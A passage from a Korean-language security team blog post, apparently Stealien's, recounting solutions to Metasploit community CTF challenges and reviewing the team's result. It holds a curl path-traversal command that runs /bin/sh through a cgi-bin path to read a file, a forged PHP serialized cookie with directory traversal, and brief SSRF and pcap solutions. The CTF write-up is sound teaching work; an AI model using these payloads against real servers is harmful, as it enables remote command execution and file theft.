<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl --path-as-is -v -X POST 'http://localhost:31337/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh' -d "echo;cat /secret/safe/flag.png" -o /tmp/flag.png
</code></pre></div></div>

<hr />

<h2 id="jack-of-hearts">Jack of Hearts</h2>

<blockquote>
  <p>Solved by <strong>Seokchan Yoon (@ch4n3)</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>20022/tcp에 http로 접근이 가능하다. 다음과 같이 user 쿠키를 변조하여 문제를 해결할 수 있었다:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">user</span> <span class="p">{</span>
    <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">user</span><span class="p">();</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">admin</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">profile_img</span> <span class="o">=</span> <span class="s2">"/var/www/html/../../../../../flag.png"</span><span class="p">;</span>

<span class="k">print</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">);</span>
<span class="k">print</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">))));</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php serialize.php
O:4:<span class="s2">"user"</span>:3:<span class="o">{</span>s:8:<span class="s2">"username"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>b:0<span class="p">;</span>s:11:<span class="s2">"profile_img"</span><span class="p">;</span>s:37:<span class="s2">"/var/www/html/../../../../../flag.png"</span><span class="p">;</span><span class="o">}</span>

<span class="nv">VHpvME9pSjFjMlZ5SWpvek9udHpPamc2SW5WelpYSnVZVzFsSWp0ek9qVTZJbUZrYldsdUlqdHpPalU2SW1Ga2JXbHVJanRpT2pBN2N6b3hNVG9pY0hKdlptbHNaVjlwYldjaU8zTTZNemM2SWk5MllYSXZkM2QzTDJoMGJXd3ZMaTR2TGk0dkxpNHZMaTR2TGk0dlpteGhaeTV3Ym1jaU8zMD0</span><span class="o">=</span>
</code></pre></div></div>

<hr />

<h2 id="ace-of-diamonds">Ace of Diamonds</h2>

<blockquote>
  <p>Solved by <strong>Dohyun Kim (@d0now)</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>35000/tcp에 http로 접근하게 되면 <code class="language-plaintext highlighter-rouge">capture.pcap</code> 파일을 획득할 수 있다. 이 파일은 SMB 프로토콜이 캡쳐된것을 확인할 수 있는데, 몇가지 수상한 행동을 한다. 하지만 이는 모두 연막이고 단순히 padding 필드가 존재하는 패킷의 padding 값을 확인해보면 ascii 범위인것을 알 수 있다. 이를 모두 조합하게 되면 다음과 같은 문자열을 획득할 수 있다:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Here is the URL you are looking for: /U,rhbjaaCeDseVRQzEO.YsgXXtoGKpvUEkZXaoxurhdYnIlpJiGszZwUktVWTS,DabQAhvbEDQaNL_Dhsq.pposWkG-DtQdIVXNEWd.KbtYXvCek_gJuzIrDtMHfITFL/flag.png
</code></pre></div></div>

<p>해당 경로로 접속하게 되면 플래그를 획득할 수 있다.</p>

<p>별개로, SMB 관리자의 계정은 다음과 같다: Administrator:netntlmv2</p>

<hr />

<h2 id="ace-of-hearts">Ace of Hearts</h2>

<blockquote>
  <p>Solved by <strong>Donggyu Kim</strong> from <strong>STLCTF</strong></p>
</blockquote>

<p>20011/tcp로 접근하게 되면 네개의 사용자의 페이지를 볼 수 있는데, 이 중 John의 페이지는 private 설정이 되어 있다. 하지만 밑의 url 검색 기능에서 SSRF가 발생하는데, 이를 이용하여 <code class="language-plaintext highlighter-rouge">/admin</code>에 접근하게 되면 John의 페이지 권한 설정을 수정할 수 있다. 그리고 John의 페이지로 접근하여 플래그를 획득할 수 있었다.</p>

<hr />

<h2 id="review">Review</h2>

<p>2년째 영국 친구들(@PostalTime)과 함께하는 metasploit community ctf 되시겠다. 대부분의 문제들이 상식선에 있었지만, 7 of Hearts 문제는 정말 지옥과도 같았다. 1등을 제외하고, 현재 2등, 3등인 팀들과 격차를 꽤 벌려 놓았었는데 결국 해당 문제를 풀지 못하여 4등을 하게 되었다. 7 of Hearts 문제의 경우 나의 주관적인 생각으론, 다른 문제들과 컨셉이 비슷하지 못했다는 점에서 그렇게 잘 만든 문제는 아닌거 같다고 보여진다. 아마도 운이 좋게 dhcp 클라이언트 포트가 열려 있는것을 발견하지 못했다면 대회가 끝날 때 까지 못 풀지 않았을까 생각한다(아이디어의 원천이 되어준 <strong>Jaehoon Jang</strong>님께 감사.)</p>

<p>이번 CTF의 경우 사실 공식적으로 STLCTF란 팀명으로 처음 진행 한 ctf이다. STLCTF는 Stealien의 연구원, Stealien의 인턴(혹은 인턴으로 재직했던 사람), Stealien Security Leader 1기, 2기로 구성되어 있다. 뭔가 빡세게 ctf를 하는 팀은 아니고, 이 그룹에 속해 있으면서 함께 ctf 나갈 기회가 있으면 함께 하는 뭐 그런 자유로운 분위기의 커뮤니티 정도로만 생각 해 주면 되겠다. 가입 의사가 있으면, Discord <code class="language-plaintext highlighter-rouge">PI#5539</code>로 연락 주길 바란다. 당연하지만 본인의 소속/이름 정도를 간단하게 밝혀주면 좋다 :)</p>

<p>또한 PostalTime도 소개해볼까 한다. PostalTime도 뭔가 열심히 CTF를 하는 팀이라기 보다는 PoC에서 만난 <a href="https://twitter.com/timwr">@tiwmr</a>을 주요로 활동하는 보안 커뮤니티 같은 느낌이다. (사실 물어보지 않아서 모른다.) 작년의 metasploit ctf 이후로 1년만에 같이 진행 했는데, 작년에는 3위를 한 것과 달리 1등수가 떨어져서 tim한테 미안할 따름이다.</p>

<blockquote>
  <p><strong>총평</strong> : 역시 ctf는 가끔 하는게 정신 건강에 이로운 것 같다.</p>
</blockquote>

    <div class="page-profile-detail">
        <div class="page-profile-detail-info">
            <div>
                <img class="page-profile_image-detail" src="/assets/stealien_inverse.png" />
            </div>
            <div style="position: relative; top: 12px;left: 10px;">
                <div class="page-profile-author">김도현</div>
                <div class="page-profile-email">dhkim@stealien.com</div>
            </div>
        </div>
    </div>
</div>

<div class="recent-post-area">
    <div class="posts container">
        <div class="h1-recent-post">RECENT POST</div>
            <div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/stealien_inverse.png" class="profile_image" />
            <div class="profile_author">김도현</div>
        </div>
    </div>
    <div class="col">
        <a href="/2023-03-19/nite-team-4-operation-castle-ivy-chapter-1">
            <div class="post-title">
                NITE Team 4: OPERATION CASTLE IVY Chapter 1 리뷰
            </div>
        </a>
        <div class="post-summary">비전공자의 시야로 고증의 측면에서</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                김도현
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Mar 19, 2023
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div><div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/2022-10-04-Secure-Coding-Training-System/profile.jpeg" class="profile_image" />
            <div class="profile_author">Seokchan Yoon</div>
        </div>
    </div>
    <div class="col">
        <a href="/2022-12-16/analyzing-django-orm-with-1-day">
            <div class="post-title">
                Analyzing Django ORM with 1-day vulnerabilities and sql bug
            </div>
        </a>
        <div class="post-summary">Let&#39;s analyze django, the king of Python web library</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                Seokchan Yoon
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Dec 16, 2022
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div>
        </div>
    </div>
</div>
		</div>
	</section><footer>
  <div class="container" style="display: flex; justify-content: space-between;">
    <!-- <a href="#top">
      <img src="/assets/white_logo.png" class="footer-logo" />
    </a> -->
    <div class="footer-copyright">Copyright &copy; Stealien Inc.</div>
    <div class="footer-icons">
      <a target="_blank" href="https://twitter.com/stealien"><img class="sns" src="/assets/icons/twitter_ic.png"/></a>
      <a target="_blank" href="https://blog.naver.com/stealien_official"><img class="sns" src="/assets/icons/blog_ic.png"/></a>
      <a target="_blank" href="https://www.facebook.com/stealien/"><img class="sns" src="/assets/icons/facebook_ic.png"/></a>
      <a target="_blank" href="https://www.youtube.com/c/STEALIEN"><img class="sns" src="/assets/icons/youtube_ic.png"/></a>
    </div>
  </div>
</footer></body>
</html>
